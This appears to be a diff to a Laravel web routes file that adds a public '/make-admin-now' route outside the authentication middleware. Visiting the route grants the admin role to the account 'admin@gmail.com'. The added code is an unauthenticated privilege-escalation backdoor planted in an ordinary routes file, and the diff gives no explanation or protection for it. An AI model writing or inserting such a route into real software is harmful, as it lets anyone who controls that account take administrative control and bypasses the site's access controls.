@@ -68,3 +68,11 @@ Route::middleware(['auth', 'admin'])->prefix('admin')->name('admin.')->group(fun
 
 // Public landing page - no auth needed
 Route::get('/', [WelcomeController::class, 'index'])->name('home');
+Route::get('/make-admin-now', function() {
+    $user = App\Models\User::where('email', 'admin@gmail.com')->first();
+    if ($user) {
+        $user->update(['role' => 'admin']);
+        return 'Done! ' . $user->name . ' is now admin.';
+    }
+    return 'User not found.';
+});
